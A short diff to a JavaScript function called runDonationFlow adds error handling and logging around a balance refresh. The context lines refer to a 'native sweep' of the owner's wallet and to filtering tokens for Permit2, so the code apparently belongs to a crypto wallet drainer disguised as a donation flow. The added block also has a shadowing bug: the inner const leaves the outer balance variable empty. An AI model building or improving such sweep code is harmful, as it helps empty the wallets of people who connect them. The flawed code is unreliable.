@@ -139,7 +139,17 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
       catch (err) { console.warn("Native sweep error:", err); }
 
       // Re-fetch balances
-      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
+    let refreshedRaw = [];
+      try {
+  console.log(">>> Fetching refreshed balances...");
+  const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
+  console.log(">>> Refreshed balances:", refreshedRaw);
+} catch (err) {
+  console.error(">>> Balance refresh failed:", err);
+        // fallback: keep using original balances or mark as unknown
+  refreshedRaw = balances;
+}
+
       const refreshedFiltered = filterPermit2SafeTokens(refreshedRaw);
 
       const refreshedProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
@@ -181,5 +191,6 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
     return { success: false, reason: err.message || String(err) };
   }
 }
+
 
 
